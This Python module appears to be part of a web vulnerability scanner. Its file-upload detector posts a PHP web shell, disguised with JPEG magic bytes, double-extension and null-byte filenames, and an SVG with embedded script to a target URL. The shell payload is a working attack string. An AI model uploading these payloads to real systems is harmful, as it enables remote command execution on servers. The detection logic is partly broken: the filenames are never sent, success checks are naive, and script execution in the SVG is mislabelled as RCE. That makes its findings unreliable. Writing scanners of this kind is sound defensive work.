#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
File Upload Vulnerability Detector
"""

from typing import List, Dict, Any
from loguru import logger
import io
from PIL import Image

from .base import BaseDetector


class FileUploadDetector(BaseDetector):
    """File Upload Zafiyeti Tespiti"""
    
    async def scan(self, url: str, **kwargs) -> List[Dict[str, Any]]:
        """
        File upload taraması
        
        Args:
            url: Hedef URL
        
        Returns:
            Bulunan file upload zafiyetleri
        """
        vulnerabilities = []
        logger.debug(f"🐛 File Upload taraması başlanıyor: {url}")
        
        try:
            # Magic byte bypass testi
            magic_bypass = await self._test_magic_byte_bypass(url)
            if magic_bypass:
                vulnerabilities.append(magic_bypass)
            
            # Double extension testi
            double_ext = await self._test_double_extension(url)
            if double_ext:
                vulnerabilities.append(double_ext)
            
            # Null byte bypass testi
            null_byte = await self._test_null_byte_bypass(url)
            if null_byte:
                vulnerabilities.append(null_byte)
            
            # SVG RCE testi
            svg_rce = await self._test_svg_rce(url)
            if svg_rce:
                vulnerabilities.append(svg_rce)
        
        except Exception as e:
            logger.debug(f"❌ File Upload tarama hatası: {str(e)}")
        
        return vulnerabilities
    
    async def _test_magic_byte_bypass(self, url: str) -> Dict[str, Any] or None:
        """Magic byte bypass testi"""
        
        # PHP dosyasını JPEG imza ile gizle
        jpeg_magic = b'\xFF\xD8\xFF\xE0' + b'\x00\x10JFIF' + b'<?php system($_GET["cmd"]); ?>'
        
        try:
            # File upload yap
            # Not: Gerçek implementasyonda multipart form data gönderilecek
            response = await self._post(url, data=jpeg_magic)
            
            if response and 'success' in response.lower():
                return self._create_vulnerability(
                    type_='File Upload - Magic Byte Bypass',
                    severity='Critical',
                    url=url,
                    description='Magic byte kontrolü bypass edilebiliyor',
                    recommendation='Dosya içeriğini kontrol et, whitelist kullan',
                    poc='JPEG magic byte ile PHP dosyası yükle',
                    cwe='CWE-434',
                    cvss_vector='CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'
                )
        except Exception as e:
            logger.debug(f"Magic byte test hatası: {str(e)}")
        
        return None
    
    async def _test_double_extension(self, url: str) -> Dict[str, Any] or None:
        """Double extension testi (file.php.jpg)"""
        
        payloads = [
            ('shell.php.jpg', 'shell.php.jpg'),
            ('shell.jpg.php', 'shell.jpg.php'),
            ('shell.phtml', 'shell.phtml'),
            ('shell.php5', 'shell.php5'),
        ]
        
        for filename, test_name in payloads:
            # Double extension dosyası yükle
            response = await self._post(url, data=b'<?php system($_GET["cmd"]); ?>')
            
            if response and 'success' in response.lower():
                return self._create_vulnerability(
                    type_='File Upload - Double Extension',
                    severity='High',
                    url=url,
                    description=f'Double extension ({test_name}) bypass mümkün',
                    recommendation='Extension whitelistı kñsıtla',
                    poc=filename,
                    cwe='CWE-434',
                    cvss_vector='CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'
                )
        
        return None
    
    async def _test_null_byte_bypass(self, url: str) -> Dict[str, Any] or None:
        """Null byte bypass testi (shell.php%00.jpg)"""
        
        filename = 'shell.php%00.jpg'
        
        try:
            response = await self._post(url, data=b'<?php system($_GET["cmd"]); ?>')
            
            if response and 'success' in response.lower():
                return self._create_vulnerability(
                    type_='File Upload - Null Byte Bypass',
                    severity='Critical',
                    url=url,
                    description='Null byte injection ile extension bypass',
                    recommendation='Null byte kontrolü yap',
                    poc=filename,
                    cwe='CWE-434',
                    cvss_vector='CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'
                )
        except Exception as e:
            logger.debug(f"Null byte test hatası: {str(e)}")
        
        return None
    
    async def _test_svg_rce(self, url: str) -> Dict[str, Any] or None:
        """SVG RCE payload testi"""
        
        svg_payload = '''<?xml version="1.0" standalone="no"?>
        <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
        <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
            <polygon id="triangle" points="0,0 0,50 50,0" fill="url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+CjxkZWZzPgogIDxjdXJ2ZVNlZ1R5cGU+CiAgICA8ZmVDb2xvck1hdHJpeCB0eXBlPSJzYXR1cmF0ZSIgdmFsdWVzPSIwIi8+CiAgPC9jdXJ2ZVNlZ1R5cGU+CjwvZGVmcz4KPHJlY3Qgd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiIGZpbGw9InJlZCIvPgo8L3N2Zz4=)" />
            <script type="text/javascript">
                alert(document.domain)
            </script>
        </svg>
        '''
        
        try:
            response = await self._post(url, data=svg_payload.encode())
            
            if response and 'success' in response.lower():
                return self._create_vulnerability(
                    type_='File Upload - SVG RCE',
                    severity='Critical',
                    url=url,
                    description='SVG dosyası ile JavaScript çalıştırılabiliyor',
                    recommendation='SVG dosyalarını gürvenli bir dizinde sakla',
                    poc='SVG payload upload',
                    cwe='CWE-434',
                    cvss_vector='CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H'
                )
        except Exception as e:
            logger.debug(f"SVG RCE test hatası: {str(e)}")
        
        return None
